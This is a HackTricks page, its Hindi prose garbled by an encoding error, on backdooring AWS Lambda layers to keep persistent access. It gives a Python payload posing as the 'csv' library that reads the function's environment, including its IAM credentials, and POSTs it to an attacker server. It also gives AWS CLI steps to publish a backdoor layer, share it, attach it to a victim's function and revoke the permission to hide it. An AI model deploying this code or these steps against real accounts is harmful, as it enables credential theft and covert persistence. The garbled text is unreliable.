# AWS - Lambda Layers Persistence

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## Lambda Layers

Lambda layer рдПрдХ .zip рдлрд╝рд╛рдЗрд▓ рдЖрд░реНрдХрд╛рдЗрд╡ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрддрд┐рд░рд┐рдХреНрдд рдХреЛрдб** рдпрд╛ рдЕрдиреНрдп рд╕рд╛рдордЧреНрд░реА рд╣реЛ рд╕рдХрддреА рд╣реИред рдПрдХ layer рдореЗрдВ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝, [рдХрд╕реНрдЯрдо рд░рдирдЯрд╛рдЗрдо](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), рдбреЗрдЯрд╛, рдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдЕрдзрд┐рдХрддрдо **рдкрд╛рдВрдЪ layers рд╢рд╛рдорд┐рд▓ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред рдЬрдм рдЖрдк рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ layer рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **рд╕рд╛рдордЧреНрд░реА `/opt`** рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдирд┐рд╖реНрдХрд░реНрд╖рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ рдирд┐рд╖реНрдкрд╛рджрди рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ**, рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ **layers** рдЖрдкрдХреЗ AWS рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рдЬреА** рд╣реЛрддреА рд╣реИрдВред рдЖрдк рдЕрдиреНрдп рдЦрд╛рддреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ layer рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ layer рдХреЛ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдПрдХ рдЕрд▓рдЧ рдЦрд╛рддреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдХрд╛рд╢рд┐рдд layer рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдЙрд╕ layer рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рд╡рд╣ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╛ рдЙрд╕ layer рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЖрдкрдХреА рдЕрдиреБрдорддрд┐ рдирд┐рд░рд╕реНрдд рдХрд░ рджреА рдЧрдИ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рд╣рдЯрд╛рдП рдЧрдП layer рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирдпрд╛ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдХрдВрдЯреЗрдирд░ рдЗрдореЗрдЬ рдХреЗ рд░реВрдк рдореЗрдВ рддреИрдирд╛рдд рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рдиреНрд╕ layers рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдЖрдк рдЕрдкрдиреЗ рдкрд╕рдВрджреАрджрд╛ рд░рдирдЯрд╛рдЗрдо, рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝, рдФрд░ рдЕрдиреНрдп рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХреЛ рдХрдВрдЯреЗрдирд░ рдЗрдореЗрдЬ рдореЗрдВ рдкреИрдХреЗрдЬ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдЖрдк рдЗрдореЗрдЬ рдмрдирд╛рддреЗ рд╣реИрдВред

### Python рд▓реЛрдб рдкрде

Lambda рдореЗрдВ Python рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд▓реЛрдб рдкрде рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
рджреЗрдЦреЗрдВ рдХрд┐ **рджреВрд╕рд░реЗ** рдФрд░ рддреАрд╕рд░реЗ **рд╕реНрдерд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реАрдЬ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ **рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░реНрд╕** рдЕрдкрдиреА рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрдирдХрдВрдкреНрд░реЗрд╕ рдХрд░рддреЗ рд╣реИрдВ: **`/opt/python/lib/python3.9/site-packages`** рдФрд░ **`/opt/python`**

{% hint style="danger" %}
рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдкреНрд░рдпреБрдХреНрдд рд▓реИрдореНрдмреНрдбрд╛ **рд▓реЗрдпрд░** рдореЗрдВ **рдмреИрдХрдбреЛрд░** рдЬреЛрдбрд╝рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рдПрдХ рдРрд╕рд╛ **рд▓реЗрдпрд░** рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдЬреЛ **рд╕рд╛рдорд╛рдиреНрдп рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдордирдорд╛рдирд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**, рддреЛ рд╡рд╣ рдкреНрд░рддреНрдпреЗрдХ рд▓реИрдореНрдмреНрдбрд╛ рдЖрд╣реНрд╡рд╛рди рдХреЗ рд╕рд╛рде рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╣реИрдВ:

* **рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рдЬреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рдХреЛрдб рджреНрд╡рд╛рд░рд╛ **рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИрдВ**
* рдПрдХ **рдкреНрд░реЙрдХреНрд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░реНрд╕ рдХреЗ рд╕рд╛рде рдмрдирд╛рдПрдВ** рдЬреЛ **рдХрд╕реНрдЯрдо рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧреА** рдФрд░ **рдореВрд▓** рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ **рд▓реЛрдб рдХрд░реЗрдЧреА**ред

### рдкрд╣рд▓реЗ рд╕реЗ рд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ

{% hint style="warning" %}
рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп рдореБрдЭреЗ рдПрдХ рдХрдард┐рдирд╛рдИ рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░рдирд╛ рдкрдбрд╝рд╛: рдХреБрдЫ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкрд╛рдпрдерди рд░рдирдЯрд╛рдЗрдо рдореЗрдВ рд▓реЛрдб рд╣реЛ рдЪреБрдХреА рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЖрдкрдХрд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИред рдореБрдЭреЗ `os` рдпрд╛ `sys` рдЬреИрд╕реА рдЪреАрдЬреЛрдВ рдХреА рдЙрдореНрдореАрдж рдереА, рд▓реЗрдХрд┐рди **`json` рд▓рд╛рдЗрдмреНрд░реЗрд░реА рднреА рд▓реЛрдб рдХреА рдЧрдИ рдереА**ред\
рдЗрд╕ рд╕реНрдерд╛рдпрд┐рддреНрд╡ рддрдХрдиреАрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдХреЛрдб рдХреЛ рдПрдХ рдирдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд▓реЛрдб рдХрд░рдиреА рд╣реЛрдЧреА рдЬреЛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдкрд░ рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред
{% endhint %}

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкрд╛рдпрдерди рдХреЛрдб рдХреЗ рд╕рд╛рде рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд▓реИрдореНрдмреНрдбрд╛ рдореЗрдВ рдкрд╛рдпрдерди рд░рдирдЯрд╛рдЗрдо рдХреЗ рдЕрдВрджрд░ **рдкрд╣рд▓реЗ рд╕реЗ рд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗ**:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
рдФрд░ рдпрд╣ рд╣реИ **рд╕реВрдЪреА** (рдпрд╣ рдЬрд╛рдВрдЪ рд▓реЗрдВ рдХрд┐ `os` рдпрд╛ `json` рдЬреИрд╕реА рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИрдВ)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
### Lambda Layer рдореЗрдВ рдмреИрдХрдбреЛрд░рд┐рдВрдЧ

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд▓рдХреНрд╖рд┐рдд рдХреЛрдб **`csv`** рдЗрдореНрдкреЛрд░реНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИред рд╣рдо **`csv` рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЗ рдЗрдореНрдкреЛрд░реНрдЯ рдореЗрдВ рдмреИрдХрдбреЛрд░рд┐рдВрдЧ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ**ред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо **csv рдирд╛рдордХ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдмрдирд╛рдПрдВрдЧреЗ** рдЬрд┐рд╕рдореЗрдВ **`__init__.py`** рдлрд╛рдЗрд▓ рд╣реЛрдЧреА, рдЬреЛ рд▓реИрдореНрдмреНрдбрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЧрдП рдкрде рдкрд░ рд╣реЛрдЧреА: **`/opt/python/lib/python3.9/site-packages`**\
рдлрд┐рд░, рдЬрдм рд▓реИрдореНрдмреНрдбрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ **csv** рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ, рд╣рдорд╛рд░реА **`__init__.py` рдлрд╛рдЗрд▓ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рдПрдЧреА**ред\
рдЗрд╕ рдлрд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдЪрд╛рд╣рд┐рдП:

* рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛
* рдореВрд▓ csv рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░рдирд╛

рд╣рдо рджреЛрдиреЛрдВ рдХрд╛рд░реНрдп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
рдлрд┐рд░, рдЗрд╕ рдХреЛрдб рдХреЛ **`python/lib/python3.9/site-packages/__init__.py`** рдкрде рдореЗрдВ рдЬрд╝рд┐рдк рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред

рдЖрдк рдЗрд╕ рдХреЛрдб рдХреЛ [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХреАрдХреГрдд рдкреЗрд▓реЛрдб **рдкрд╣рд▓реА рдмрд╛рд░ рдЬрдм рдЗрд╕реЗ рдЖрд╣реНрд╡рд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рд▓реИрдореНрдмреНрдбрд╛ рдХрдВрдЯреЗрдирд░ рдХреЗ рд░реАрд╕реЗрдЯ рдХреЗ рдмрд╛рдж (рдХреЛрдб рдХрд╛ рдкрд░рд┐рд╡рд░реНрддрди рдпрд╛ рдардВрдбрд╛ рд▓реИрдореНрдмреНрдбрд╛) IAM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдПрдХ рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬреЗрдЧрд╛**, рд▓реЗрдХрд┐рди **рдЕрдиреНрдп рддрдХрдиреАрдХреЗрдВ** рдЬреИрд╕реЗ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рднреА рдПрдХреАрдХреГрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### рдмрд╛рд╣рд░реА рд▓реЗрдпрд░реНрд╕

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдмрд╛рд╣рд░реА рдЦрд╛рддреЛрдВ рд╕реЗ рд▓реИрдореНрдмреНрдбрд╛ рд▓реЗрдпрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ рд▓реИрдореНрдмреНрдбрд╛ рдПрдХ рдмрд╛рд╣рд░реА рдЦрд╛рддреЗ рд╕реЗ рдПрдХ рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рднрд▓реЗ рд╣реА рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЕрдиреБрдорддрд┐рдпрд╛рдВ рди рд╣реЛрдВред\
рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХ рд▓реИрдореНрдмреНрдбрд╛ рдХреЗ рдкрд╛рд╕ рдЕрдзрд┐рдХрддрдо 5 рд▓реЗрдпрд░реНрд╕ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдмрд╣реБрдореБрдЦреА рдкреНрд░рддрд┐рднрд╛ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдореМрдЬреВрджрд╛ рд▓реЗрдпрд░ рдореЗрдВ рдмреИрдХрдбреЛрд░ рдЬреЛрдбрд╝реЗрдВ (рдХреБрдЫ рднреА рдмрд╛рд╣рд░реА рдирд╣реАрдВ рд╣реИ)
* **рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдореЗрдВ рдПрдХ** **рд▓реЗрдпрд░ рдмрдирд╛рдПрдВ**, **рдкреАрдбрд╝рд┐рдд рдЦрд╛рддреЗ рдХреЛ рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ**, **рд▓реЗрдпрд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓реИрдореНрдмреНрдбрд╛ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ** рдФрд░ **рдЕрдиреБрдорддрд┐ рд╣рдЯрд╛ рджреЗрдВ**ред
* **рд▓реИрдореНрдмреНрдбрд╛** рдЕрднреА рднреА **рд▓реЗрдпрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛** рдФрд░ **рдкреАрдбрд╝рд┐рдд рдХреЗ рдкрд╛рд╕ рд▓реЗрдпрд░реНрд╕ рдХреЛрдб рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛** (рд▓реИрдореНрдмреНрдбрд╛ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдЕрд▓рд╛рд╡рд╛)
* рдкреАрдбрд╝рд┐рдд **`aws lambda list-layers`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрд╛рд╣рд░реА рд▓реЗрдпрд░реНрд╕ рдХреЛ рдирд╣реАрдВ рджреЗрдЦ рдкрд╛рдПрдЧрд╛

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
